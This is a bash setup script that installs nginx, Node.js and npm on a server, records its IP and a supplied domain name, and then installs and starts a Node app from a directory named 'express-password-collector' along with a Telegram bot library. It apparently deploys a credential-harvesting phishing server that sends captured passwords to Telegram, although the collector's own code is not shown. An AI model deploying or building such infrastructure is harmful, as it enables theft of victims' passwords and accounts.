#!/bin/bash



# Function to get VM IP address (assuming Linux with ip command)
# get_vm_ip() {
#   # Get IP address of the first non-loopback interface
#   vm_ip=$(ip route get default | awk '{print $NF}')
#   if [[ -z "$vm_ip" ]]; then
#     echo "Error: Could not determine VM IP address."
#     exit 1
#   fi
#   echo "$vm_ip"
# }



get_vm_ip() {
  vm_ip=$(hostname -I | awk '{print $1}')
  if [[ -z "$vm_ip" ]]; then
    echo "Error: Could not determine VM IP address."
    exit 1
  fi
  echo "$vm_ip"
}




# Get the domain name as an argument
domain_name="$1"

# Check if domain name is provided
if [[ -z "$domain_name" ]]; then
  echo "Error: Please provide a domain name as an argument."
  echo "Usage: $0 <domain_name>"
  exit 1
fi


vm_ip=$(get_vm_ip)

echo "$vm_ip" > ip.txt

echo "$domain_name" > domain.txt

# Check if the user is running the script with root privileges
if [[ $EUID -ne 0 ]]; then
  echo "This script must be run with root privileges. Please use 'sudo'."
  exit 1
fi

# Update package lists
apt-get update

# Install Nginx
apt-get install nginx -y

# Check if Nginx is installed and running
if [[ $(systemctl status nginx | grep active | awk '{print $3}') == "active" ]]; then
  echo "Nginx is installed and running!"
else
  echo "Nginx installation failed or is not running. Please check the logs for errors."
fi

# install node.js
sudo apt-get install nodejs  # For Debian/Ubuntu system


# Define the original file and backup filename
original_file="/etc/nginx/sites-available/default"
backup_file="${original_file}.bak"

# Copy the original file to the backup filename
cp "$original_file" "$backup_file"

# Optional: Print confirmation message
echo "Created backup: $backup_file"

# start nginx server
sudo service nginx restart
sudo systemctl restart nginx

# setup nginx

# # Define the replacement content (location block)
# replacement="
# location / {
#         proxy_pass http://localhost:5000;
#         proxy_http_version 1.1;
#         proxy_set_header Upgrade \$http_upgrade;
#         proxy_set_header Connection 'upgrade';
#         proxy_set_header Host \$host;
#         proxy_cache_bypass \$http_upgrade;
#     }
# "

# # Escape dollar signs ($) in the replacement string for sed
# escaped_replacement=$(echo "$replacement" | sed 's/\$/\\$/g')

# # Perform the in-place edit (make sure you have a backup!)
# # sudo sed -i "s/location.*?\{/\\n$escaped_replacement{/" /etc/nginx/sites-available/default
# sudo sed -i "s/location.*?\{/\\n$escaped_replacement{/" "$original_file"

# echo "Updated /etc/nginx/sites-available/default (make sure you have a backup!)"



# Store the current directory
current_dir=$(pwd)

# apt install npm
apt install npm

# Change directory to the target directory
pushd micr/express-password-collector

# run npm install
npm install

# run npm install bot
npm install node-telegram-bot-api
npm install @types/node-telegram-bot-api
npm install dotenv --save

# Run the command in the target directory
touch src/.env

npm run dev

# test up and running
curl localhost:5000


# Pop back to the previous directory
popd


